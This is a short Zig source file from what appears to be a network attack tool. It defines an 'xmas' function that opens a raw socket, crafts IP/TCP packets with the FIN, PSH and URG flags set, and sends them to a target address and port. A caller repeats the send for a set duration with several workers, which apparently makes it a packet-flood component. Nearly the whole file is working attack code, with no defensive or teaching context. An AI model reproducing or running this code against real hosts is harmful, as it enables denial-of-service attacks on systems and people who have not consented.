const std = @import("std");

const helpers = @import("../helpers.zig");

const IpHeader = @import("headers/IpHeader.zig");
const TcpHeader = @import("headers/TcpHeader.zig");
const PsdHeader = @import("headers/PsdHeader.zig");
const Caller = @import("Caller.zig");

const linux = std.os.linux;

const assemble = @import("headers/assemble.zig");

pub fn xmas(dst_ip: [4]u8, port: u16, duration: u32) void {
    const c = Caller.init(std.heap.page_allocator, 5, duration, @constCast(&_xmas), .{ .ip = dst_ip, .port = port });

    c.call();
}

pub fn _xmas(dst_ip: [4]u8, port: u16) void {
    const fd = linux.socket(linux.AF.INET, linux.SOCK.RAW, linux.IPPROTO.TCP);
    defer _ = linux.close(@intCast(fd));

    const sockaddr = std.net.Address{ .in = std.net.Ip4Address.init(dst_ip, port) };

    const enable = std.mem.toBytes(@as(c_int, 1));

    helpers.setsockopt(@intCast(fd), linux.IPPROTO.IP, linux.IP.HDRINCL, &enable, @intCast(enable.len)) catch |err| {
        std.debug.print("err {s}\n", .{@errorName(err)});
        return;
    };

    const ip_h = IpHeader.init(dst_ip, 0x06).marshal();
    var psd_h = PsdHeader.init(dst_ip, 0x06);
    var tcp_h = TcpHeader.init(port, 0x01 | 0x20 | 0x08);

    const packet = assemble.packet(ip_h, &tcp_h, &psd_h);

    _ = helpers.sendto(@intCast(fd), &packet, packet.len, linux.MSG.NOSIGNAL, &sockaddr.any, @intCast(@as(linux.socklen_t, sockaddr.getOsSockLen()))) catch |err| {
        std.debug.print("haha {s}", .{@errorName(err)});
        return;
    };
}
